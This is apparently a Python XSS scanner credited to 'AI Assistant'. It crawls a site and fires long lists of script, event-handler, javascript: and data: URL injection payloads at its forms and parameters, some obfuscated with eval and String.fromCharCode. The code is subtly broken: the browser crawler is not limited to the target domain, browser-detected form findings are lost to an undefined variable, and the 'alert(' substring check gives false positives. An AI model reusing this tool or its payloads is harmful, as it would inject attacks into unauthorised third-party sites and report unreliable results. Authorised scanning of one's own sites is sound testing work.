#!/usr/bin/env python3
"""
XSS Scanner - Advanced XSS vulnerability scanner
Author: AI Assistant
Version: 1.0
"""

import requests
import re
import urllib.parse
import time
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from colorama import init, Fore, Style
import sys
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import asyncio
from urllib.robotparser import RobotFileParser

# Initialize colorama for colored output
init()

class XSSScanner:
    def __init__(self, target_url, max_threads=10, delay=1, max_depth=3, headless=True):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.max_depth = max_depth
        self.headless = headless
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.visited_urls = set()
        self.playwright = None
        self.browser = None
        self.context = None
        
    def log(self, message, level="INFO"):
        """Print a colored log message based on level"""
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.MAGENTA
        }
        print(f"{colors.get(level, Fore.WHITE)}[{level}] {message}{Style.RESET_ALL}")
    
    def extract_forms(self, html_content, base_url):
        """Extract forms from HTML"""
        forms = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            # Extract input fields
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                form_data['inputs'].append(input_data)
            
            # Convert action to absolute URL
            if form_data['action']:
                form_data['action'] = urljoin(base_url, form_data['action'])
            else:
                form_data['action'] = base_url
                
            forms.append(form_data)
        
        return forms
    
    def extract_links(self, html_content, base_url):
        """Extract links from HTML"""
        links = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            links.append(full_url)
        
        return links
    
    def extract_parameters(self, url):
        """Extract query parameters from URL"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params
    
    def reconnaissance(self):
        """Browser-based reconnaissance phase - comprehensive information gathering"""
        self.log("Starting browser-based reconnaissance phase...", "INFO")
        
        if not self.init_browser():
            self.log("Falling back to requests-based reconnaissance", "WARNING")
            return self.reconnaissance_requests()
        
        try:
            # Multi-level crawling
            all_urls = self.crawl_with_browser(self.target_url, self.max_depth)
            self.log(f"Discovered {len(all_urls)} URLs for analysis", "SUCCESS")
            
            all_forms = []
            all_params = set()
            
            # Analyze each discovered URL
            for url in all_urls:
                try:
                    # Extract forms from each URL
                    forms = self.extract_forms_with_browser(url)
                    all_forms.extend(forms)
                    
                    # Extract parameters
                    params = self.extract_parameters(url)
                    all_params.update(params.keys())
                    
                except Exception as e:
                    self.log(f"Error analyzing {url}: {str(e)}", "ERROR")
                    continue
            
            # Get base URL parameters
            base_params = self.extract_parameters(self.target_url)
            
            self.log(f"Total forms found: {len(all_forms)}", "INFO")
            self.log(f"Total unique parameters: {len(all_params)}", "INFO")
            self.log(f"Base URL parameters: {len(base_params)}", "INFO")
            
            return {
                'forms': all_forms,
                'urls': all_urls,
                'params': base_params,
                'all_params': list(all_params),
                'browser_ready': True
            }
            
        except Exception as e:
            self.log(f"Error during browser reconnaissance: {str(e)}", "ERROR")
            return self.reconnaissance_requests()
    
    def reconnaissance_requests(self):
        """Fallback reconnaissance using requests"""
        self.log("Using requests-based reconnaissance...", "INFO")
        
        try:
            # BFS crawl with requests (same-origin)
            urls_to_visit = [(self.target_url, 0)]
            visited = set()
            discovered_urls = []
            all_forms = []

            base_origin = urlparse(self.target_url).netloc

            while urls_to_visit:
                current_url, depth = urls_to_visit.pop(0)
                if current_url in visited or depth > self.max_depth:
                    continue

                visited.add(current_url)
                discovered_urls.append(current_url)

                try:
                    response = self.session.get(current_url, timeout=10)
                    response.raise_for_status()
                    if current_url == self.target_url:
                        self.log(f"Successful request to {self.target_url}", "SUCCESS")

                    # Extract forms on this page
                    page_forms = self.extract_forms(response.text, current_url)
                    all_forms.extend(page_forms)

                    # Extract and enqueue same-origin links
                    links = self.extract_links(response.text, current_url)
                    for link in links:
                        parsed = urlparse(link)
                        if parsed.scheme in ("http", "https") and parsed.netloc == base_origin and link not in visited:
                            urls_to_visit.append((link, depth + 1))

                    time.sleep(self.delay)
                except Exception:
                    continue

            self.log(f"Discovered {len(discovered_urls)} URLs (requests crawler)", "INFO")
            self.log(f"Total forms found: {len(all_forms)}", "INFO")

            # Extract parameters from base URL
            params = self.extract_parameters(self.target_url)
            self.log(f"Number of base URL parameters: {len(params)}", "INFO")
            
            return {
                'forms': all_forms,
                'urls': discovered_urls or [self.target_url],
                'params': params,
                'all_params': list(params.keys()),
                'browser_ready': False
            }
            
        except Exception as e:
            self.log(f"Error during reconnaissance: {str(e)}", "ERROR")
            return None
    
    def identify_contexts(self, param_value, html_content):
        """Identify potential reflection contexts for a parameter value"""
        contexts = []
        
        # HTML Context
        if re.search(r'<[^>]*' + re.escape(param_value) + r'[^>]*>', html_content, re.IGNORECASE):
            contexts.append('html')
        
        # Attribute Context
        if re.search(r'=\s*["\']' + re.escape(param_value) + r'["\']', html_content, re.IGNORECASE):
            contexts.append('attribute')
        
        # JavaScript Context
        if re.search(r'<script[^>]*>.*' + re.escape(param_value) + r'.*</script>', html_content, re.IGNORECASE | re.DOTALL):
            contexts.append('javascript')
        
        # CSS Context
        if re.search(r'<style[^>]*>.*' + re.escape(param_value) + r'.*</style>', html_content, re.IGNORECASE | re.DOTALL):
            contexts.append('css')
        
        # URL Context
        if re.search(r'https?://[^\s]*' + re.escape(param_value) + r'[^\s]*', html_content, re.IGNORECASE):
            contexts.append('url')
        
        return contexts if contexts else ['html']  # Default to HTML context
    
    def generate_payloads(self, context):
        """Generate XSS payloads per detected context"""
        payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus><option>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<isindex onfocus=alert("XSS") autofocus>',
                '<form><button formaction="javascript:alert(\'XSS\')">',
                '<object data="javascript:alert(\'XSS\')">',
                '<embed src="javascript:alert(\'XSS\')">',
                '<applet code="javascript:alert(\'XSS\')">',
                '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')" x="',
                "' onmouseover='alert(\"XSS\")' x='",
                '" onfocus="alert(\'XSS\')" autofocus="',
                "' onfocus='alert(\"XSS\")' autofocus='",
                '" onload="alert(\'XSS\')" x="',
                "' onload='alert(\"XSS\")' x='",
                '" onerror="alert(\'XSS\')" x="',
                "' onerror='alert(\"XSS\")' x='",
                '" onclick="alert(\'XSS\')" x="',
                "' onclick='alert(\"XSS\")' x='",
                '" onblur="alert(\'XSS\')" autofocus="',
                "' onblur='alert(\"XSS\")' autofocus='",
                '" onchange="alert(\'XSS\')" x="',
                "' onchange='alert(\"XSS\")' x='",
                '" onsubmit="alert(\'XSS\')" x="',
                "' onsubmit='alert(\"XSS\")' x='",
                '" onreset="alert(\'XSS\')" x="',
                "' onreset='alert(\"XSS\")' x='",
                '" onselect="alert(\'XSS\')" x="',
                "' onselect='alert(\"XSS\")' x='"
            ],
            'javascript': [
                '";alert("XSS");//',
                "';alert('XSS');//",
                '";alert(String.fromCharCode(88,83,83));//',
                "';alert(String.fromCharCode(88,83,83));//",
                '";alert(/XSS/);//',
                "';alert(/XSS/);//",
                '";alert`XSS`;//',
                "';alert`XSS`;//",
                '";eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41));//',
                "';eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41));//",
                '";window["alert"]("XSS");//',
                "';window['alert']('XSS');//",
                '";setTimeout("alert(\\"XSS\\")",0);//',
                "';setTimeout('alert(\\'XSS\\')',0);//",
                '";setInterval("alert(\\"XSS\\")",1000);//',
                "';setInterval('alert(\\'XSS\\')',1000);//",
                '";Function("alert(\\"XSS\\")")();//',
                "';Function('alert(\\'XSS\\')')();//",
                '";[].constructor.constructor("alert(\\"XSS\\")")();//',
                "';[].constructor.constructor('alert(\\'XSS\\')')();//"
            ],
            'css': [
                'expression(alert("XSS"))',
                'expression(alert(String.fromCharCode(88,83,83)))',
                'expression(eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)))',
                'expression(window["alert"]("XSS"))',
                'expression(setTimeout("alert(\\"XSS\\")",0))',
                'expression(setInterval("alert(\\"XSS\\")",1000))',
                'expression(Function("alert(\\"XSS\\")")())',
                'expression([].constructor.constructor("alert(\\"XSS\\")")())',
                'url("javascript:alert(\\"XSS\\")")',
                'url("javascript:alert(String.fromCharCode(88,83,83))")',
                'url("javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))")',
                'url("javascript:window[\\"alert\\"](\\"XSS\\")")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))',
                'javascript:window["alert"]("XSS")',
                'javascript:setTimeout("alert(\\"XSS\\")",0)',
                'javascript:setInterval("alert(\\"XSS\\")",1000)',
                'javascript:Function("alert(\\"XSS\\")")()',
                'javascript:[].constructor.constructor("alert(\\"XSS\\")")()',
                'data:text/html,<script>alert("XSS")</script>',
                'data:text/html,<img src=x onerror=alert("XSS")>',
                'data:text/html,<svg onload=alert("XSS")>',
                'data:text/html,<iframe src="javascript:alert(\'XSS\')">',
                'data:text/html,<body onload=alert("XSS")>',
                'data:text/html,<input onfocus=alert("XSS") autofocus>',
                'data:text/html,<select onfocus=alert("XSS") autofocus><option>',
                'data:text/html,<textarea onfocus=alert("XSS") autofocus>',
                'data:text/html,<keygen onfocus=alert("XSS") autofocus>',
                'data:text/html,<video><source onerror="alert(\'XSS\')">',
                'data:text/html,<audio src=x onerror=alert("XSS")>',
                'data:text/html,<details open ontoggle=alert("XSS")>'
            ]
        }
        
        return payloads.get(context, payloads['html'])
    
    def init_browser(self):
        """Initialize Playwright browser"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=self.headless,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
            self.context = self.browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            )
            self.log("Browser initialized successfully", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"Failed to initialize browser: {str(e)}", "ERROR")
            return False
    
    def close_browser(self):
        """Close browser and cleanup"""
        try:
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
            self.log("Browser closed successfully", "INFO")
        except Exception as e:
            self.log(f"Error closing browser: {str(e)}", "ERROR")
    
    def crawl_with_browser(self, start_url, max_depth=3):
        """Multi-level crawling using Chrome browser"""
        self.log(f"Starting browser-based crawling (depth: {max_depth})", "INFO")
        urls_to_visit = [(start_url, 0)]
        all_urls = set()
        
        while urls_to_visit:
            current_url, depth = urls_to_visit.pop(0)
            
            if depth > max_depth or current_url in self.visited_urls:
                continue
                
            self.visited_urls.add(current_url)
            all_urls.add(current_url)
            
            try:
                page = self.context.new_page()
                page.goto(current_url, wait_until='networkidle', timeout=10000)
                
                # Extract links
                links = page.evaluate("""
                    () => {
                        const links = [];
                        document.querySelectorAll('a[href]').forEach(a => {
                            const href = a.href;
                            if (href && !href.startsWith('javascript:') && !href.startsWith('mailto:')) {
                                links.push(href);
                            }
                        });
                        return links;
                    }
                """)
                
                # Add new links for next depth level
                for link in links:
                    if link not in self.visited_urls and depth < max_depth:
                        urls_to_visit.append((link, depth + 1))
                
                page.close()
                time.sleep(self.delay)
                
            except Exception as e:
                self.log(f"Error crawling {current_url}: {str(e)}", "ERROR")
                continue
        
        self.log(f"Crawling completed. Found {len(all_urls)} URLs", "SUCCESS")
        return list(all_urls)
    
    def extract_forms_with_browser(self, url):
        """Extract forms using browser for better JavaScript handling"""
        try:
            page = self.context.new_page()
            page.goto(url, wait_until='networkidle', timeout=10000)
            
            forms = page.evaluate("""
                () => {
                    const forms = [];
                    document.querySelectorAll('form').forEach(form => {
                        const formData = {
                            action: form.action || window.location.href,
                            method: (form.method || 'GET').toUpperCase(),
                            inputs: []
                        };
                        
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            formData.inputs.push({
                                name: input.name || '',
                                type: input.type || 'text',
                                value: input.value || ''
                            });
                        });
                        
                        forms.push(formData);
                    });
                    return forms;
                }
            """)
            
            page.close()
            return forms
            
        except Exception as e:
            self.log(f"Error extracting forms from {url}: {str(e)}", "ERROR")
            return []
    
    def detect_dom_sinks(self, url, param_name, param_value):
        """Detect DOM sinks for precise context identification"""
        try:
            page = self.context.new_page()
            
            # Inject parameter into URL
            test_url = f"{url}?{param_name}={urllib.parse.quote(param_value)}"
            page.goto(test_url, wait_until='networkidle', timeout=10000)
            
            # Check for DOM sinks
            sinks = page.evaluate("""
                (paramValue) => {
                    const sinks = [];
                    
                    // Check innerHTML sinks
                    const elements = document.querySelectorAll('*');
                    elements.forEach(el => {
                        if (el.innerHTML && el.innerHTML.includes(paramValue)) {
                            sinks.push({
                                type: 'innerHTML',
                                element: el.tagName,
                                context: 'html'
                            });
                        }
                    });
                    
                    // Check attribute sinks
                    elements.forEach(el => {
                        for (let attr of el.attributes) {
                            if (attr.value && attr.value.includes(paramValue)) {
                                sinks.push({
                                    type: 'attribute',
                                    element: el.tagName,
                                    attribute: attr.name,
                                    context: 'attribute'
                                });
                            }
                        }
                    });
                    
                    // Check script sinks
                    const scripts = document.querySelectorAll('script');
                    scripts.forEach(script => {
                        if (script.textContent && script.textContent.includes(paramValue)) {
                            sinks.push({
                                type: 'script',
                                element: 'script',
                                context: 'javascript'
                            });
                        }
                    });
                    
                    // Check style sinks
                    const styles = document.querySelectorAll('style');
                    styles.forEach(style => {
                        if (style.textContent && style.textContent.includes(paramValue)) {
                            sinks.push({
                                type: 'style',
                                element: 'style',
                                context: 'css'
                            });
                        }
                    });
                    
                    return sinks;
                }
            """, param_value)
            
            page.close()
            return sinks
            
        except Exception as e:
            self.log(f"Error detecting DOM sinks: {str(e)}", "ERROR")
            return []
    
    def test_payload_with_browser(self, url, param_name, payload, method='GET'):
        """Test XSS payload using browser for better detection"""
        try:
            page = self.context.new_page()
            
            # Set up alert handler
            alert_triggered = False
            alert_message = ""
            
            def handle_alert(dialog):
                nonlocal alert_triggered, alert_message
                alert_triggered = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_alert)
            
            if method.upper() == 'GET':
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                page.goto(test_url, wait_until='networkidle', timeout=10000)
            else:
                page.goto(url, wait_until='networkidle', timeout=10000)
                
                # Fill form with payload
                page.evaluate(f"""
                    () => {{
                        const inputs = document.querySelectorAll('input[name="{param_name}"], textarea[name="{param_name}"], select[name="{param_name}"]');
                        inputs.forEach(input => {{
                            input.value = '{payload.replace("'", "\\'")}';
                        }});
                        
                        const forms = document.querySelectorAll('form');
                        forms.forEach(form => {{
                            if (form.method.toLowerCase() === 'post') {{
                                form.submit();
                            }}
                        }});
                    }}
                """)
            
            # Wait a bit for potential alerts
            page.wait_for_timeout(2000)
            
            page.close()
            
            if alert_triggered:
                return True, f"Alert triggered: {alert_message}"
            
        except Exception as e:
            self.log(f"Error testing payload with browser: {str(e)}", "ERROR")
        
        return False, ""
    
    def test_payload(self, url, param_name, payload, method='GET'):
        """Test a single XSS payload against a parameter"""
        try:
            if method.upper() == 'GET':
                # Test GET
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
            else:
                # Test POST
                data = {param_name: payload}
                response = self.session.post(url, data=data, timeout=10)
            
            # Check for alert presence in response
            if 'alert(' in response.text or 'alert("' in response.text or "alert('" in response.text:
                return True, response.text
                
        except Exception as e:
            self.log(f"Error testing payload: {str(e)}", "ERROR")
            
        return False, ""
    
    def scan_parameter(self, url, param_name, contexts, method='GET', use_browser=True):
        """Scan a single parameter for XSS using browser or requests"""
        self.log(f"Scanning parameter: {param_name}", "INFO")
        
        # Detect DOM sinks if using browser
        if use_browser and self.browser:
            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
            sinks = self.detect_dom_sinks(url, param_name, test_value)
            if sinks:
                self.log(f"DOM sinks detected: {[s['context'] for s in sinks]}", "INFO")
                contexts = list(set([s['context'] for s in sinks]))
        
        for context in contexts:
            self.log(f"Testing context: {context}", "INFO")
            payloads = self.generate_payloads(context)
            
            for payload in payloads:
                if use_browser and self.browser:
                    success, response = self.test_payload_with_browser(url, param_name, payload, method)
                else:
                    success, response = self.test_payload(url, param_name, payload, method)
                
                if success:
                    with self.lock:
                        vuln = {
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'context': context,
                            'method': method,
                            'response': response[:1000] if response else "",
                            'browser_detected': use_browser and self.browser is not None
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f"XSS FOUND! Parameter: {param_name}, Context: {context}", "VULN")
                        self.log(f"Payload: {payload}", "VULN")
                        return True
                
                time.sleep(self.delay)  # delay between requests
        
        return False
    
    def scan_form(self, form):
        """Scan a single form for XSS"""
        self.log(f"Scanning form: {form['action']}", "INFO")
        
        for input_field in form['inputs']:
            if input_field['name']:
                # Test with multiple contexts
                contexts = ['html', 'attribute', 'javascript']
                
                for context in contexts:
                    payloads = self.generate_payloads(context)
                    
                    for payload in payloads:
                        # Prepare form data
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form['action'], data=form_data, timeout=10)
                            else:
                                response = self.session.get(form['action'], params=form_data, timeout=10)
                            
                            if 'alert(' in response.text or 'alert("' in response.text or "alert('" in response.text:
                                with self.lock:
                                    vuln = {
                                        'url': form['action'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'context': context,
                                        'method': form['method'],
                                        'response': response.text[:1000]
                                    }
                                    self.vulnerabilities.append(vuln)
                                    self.log(f"XSS FOUND! Form: {form['action']}, Field: {input_field['name']}", "VULN")
                                    self.log(f"Payload: {payload}", "VULN")
                                    return True
                                    
                        except Exception as e:
                            self.log(f"Error testing form: {str(e)}", "ERROR")
                        
                        time.sleep(self.delay)
        
        return False
    
    def run_scan(self):
        """Run full XSS scan with browser support"""
        self.log("Starting comprehensive XSS scan...", "INFO")
        
        try:
            # Reconnaissance phase
            recon_data = self.reconnaissance()
            if not recon_data:
                self.log("Error in reconnaissance phase", "ERROR")
                return
            
            use_browser = recon_data.get('browser_ready', False)
            
            # Scan all discovered URLs
            urls_to_scan = recon_data.get('urls', [self.target_url])
            self.log(f"Scanning {len(urls_to_scan)} URLs", "INFO")
            
            for url in urls_to_scan:
                try:
                    # Scan URL parameters
                    url_params = self.extract_parameters(url)
                    if url_params:
                        self.log(f"Scanning parameters for {url}...", "INFO")
                        for param_name in url_params:
                            contexts = ['html', 'attribute', 'javascript', 'css', 'url']
                            self.scan_parameter(url, param_name, contexts, 'GET', use_browser)
                    
                    # Scan forms on this URL
                    if use_browser:
                        forms = self.extract_forms_with_browser(url)
                    else:
                        # Fallback to requests
                        response = self.session.get(url, timeout=10)
                        forms = self.extract_forms(response.text, url)
                    
                    for form in forms:
                        self.scan_form_browser(form, use_browser) if use_browser else self.scan_form(form)
                        
                except Exception as e:
                    self.log(f"Error scanning {url}: {str(e)}", "ERROR")
                    continue
            
            # Show results
            self.show_results()
            
        finally:
            # Cleanup browser
            if self.browser:
                self.close_browser()
    
    def scan_form_browser(self, form, use_browser=True):
        """Scan a single form for XSS using browser"""
        self.log(f"Scanning form: {form['action']}", "INFO")
        
        for input_field in form['inputs']:
            if input_field['name']:
                # Test with multiple contexts
                contexts = ['html', 'attribute', 'javascript']
                
                for context in contexts:
                    payloads = self.generate_payloads(context)
                    
                    for payload in payloads:
                        try:
                            if use_browser and self.browser:
                                success, response = self.test_payload_with_browser(
                                    form['action'], input_field['name'], payload, form['method']
                                )
                            else:
                                # Fallback to requests
                                form_data = {}
                                for field in form['inputs']:
                                    if field['name'] == input_field['name']:
                                        form_data[field['name']] = payload
                                    else:
                                        form_data[field['name']] = field['value']
                                
                                if form['method'] == 'POST':
                                    response = self.session.post(form['action'], data=form_data, timeout=10)
                                else:
                                    response = self.session.get(form['action'], params=form_data, timeout=10)
                                
                                success = 'alert(' in response.text or 'alert("' in response.text or "alert('" in response.text
                                response_text = response.text if success else ""
                            
                            if success:
                                with self.lock:
                                    vuln = {
                                        'url': form['action'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'context': context,
                                        'method': form['method'],
                                        'response': response_text[:1000] if response_text else "",
                                        'browser_detected': use_browser and self.browser is not None
                                    }
                                    self.vulnerabilities.append(vuln)
                                    self.log(f"XSS FOUND! Form: {form['action']}, Field: {input_field['name']}", "VULN")
                                    self.log(f"Payload: {payload}", "VULN")
                                    return True
                                    
                        except Exception as e:
                            self.log(f"Error testing form: {str(e)}", "ERROR")
                        
                        time.sleep(self.delay)
        
        return False
    
    def show_results(self):
        """Display scan results"""
        self.log("=" * 50, "INFO")
        self.log("XSS Scan Results", "INFO")
        self.log("=" * 50, "INFO")
        
        if not self.vulnerabilities:
            self.log("No XSS vulnerabilities found", "WARNING")
            return
        
        self.log(f"Total findings: {len(self.vulnerabilities)}", "SUCCESS")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            self.log(f"\n--- Vulnerability {i} ---", "VULN")
            self.log(f"URL: {vuln['url']}", "VULN")
            self.log(f"Parameter: {vuln['parameter']}", "VULN")
            self.log(f"Context: {vuln['context']}", "VULN")
            self.log(f"Method: {vuln['method']}", "VULN")
            self.log(f"Payload: {vuln['payload']}", "VULN")
            # Robust POC URL builder
            try:
                parsed = urlparse(vuln['url'])
                query = parse_qs(parsed.query)
                query[vuln['parameter']] = [vuln['payload']]
                new_query = urllib.parse.urlencode(query, doseq=True, safe='/:?&=')
                poc_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                self.log(f"POC: {poc_url}", "VULN")
            except Exception:
                self.log(f"POC: {vuln['url']}?{vuln['parameter']}={urllib.parse.quote(vuln['payload'])}", "VULN")
        
        # Save results
        self.save_results()
    
    def save_results(self):
        """Save results to JSON file"""
        try:
            with open('xss_results.json', 'w', encoding='utf-8') as f:
                json.dump(self.vulnerabilities, f, ensure_ascii=False, indent=2)
            self.log("Results saved to xss_results.json", "SUCCESS")
        except Exception as e:
            self.log(f"Error saving results: {str(e)}", "ERROR")

def main():
    parser = argparse.ArgumentParser(description='XSS Scanner - Advanced XSS vulnerability scanner with Chrome support')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=1, help='Delay between requests in seconds (default: 1)')
    parser.add_argument('--depth', type=int, default=3, help='Crawling depth (default: 3)')
    parser.add_argument('--no-headless', action='store_true', help='Run browser in visible mode (default: headless)')
    
    args = parser.parse_args()
    
    scanner = XSSScanner(
        args.url, 
        args.threads, 
        args.delay, 
        args.depth, 
        headless=not args.no_headless
    )
    scanner.run_scan()

if __name__ == "__main__":
    main()